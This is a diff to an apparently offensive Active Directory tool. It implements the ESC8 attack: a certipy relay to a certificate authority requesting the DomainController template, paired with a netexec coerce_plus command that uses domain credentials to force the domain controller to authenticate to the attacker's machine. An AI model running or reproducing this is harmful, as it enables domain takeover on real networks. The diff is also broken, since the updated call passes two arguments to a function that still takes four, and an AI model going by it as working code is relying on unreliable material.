@@ -127,7 +127,7 @@ def handle_ESC7(args, selected_template, selected_admin, target):
     certipy_ESC7(args, selected_template, target)
 
 def handle_ESC8(args, selected_template, selected_admin, target):
-    certipy_ESC8(args, selected_template, selected_admin, target)
+    certipy_ESC8(args, target)
 
 
 # === ESC Exploits ===
@@ -200,4 +200,9 @@ def certipy_ESC7(args, selected_template, selected_admin, target):
     print("[!] ESC7 exploitation not implemented.", target)
 
 def certipy_ESC8(args, selected_template, selected_admin, target):
-    print("[!] ESC8 exploitation not implemented.")
+    local_ip = general.get_local_ip()
+    cmds = [
+        f"certipy.pyz relay -target {target} -template DomainController | tee ActiveDirectory/ADCS/esc_8",
+        f"nxc smb {args.dc_ip} -u {args.domain_user} -p {args.domain_pass} -d {args.domain} -M coerce_plus -o L={local_ip}"
+    ]
+    commands.threaded_commands(cmds, target, "cyan")
